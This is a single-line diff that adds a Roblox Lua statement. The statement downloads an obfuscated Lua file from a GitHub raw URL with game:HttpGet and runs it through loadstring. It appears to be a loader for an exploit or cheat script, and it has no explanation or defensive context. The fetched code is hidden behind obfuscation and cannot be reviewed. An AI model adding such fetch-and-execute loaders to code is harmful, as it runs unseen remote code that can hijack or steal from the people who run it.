@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fg4projects/mindless/refs/heads/main/obf_JZUg5y3Lmm6J7z86ve41pX801NFhmHT3yhe4vdV38Ue443GX72hDKbUBPH23Wj97.lua"))() 
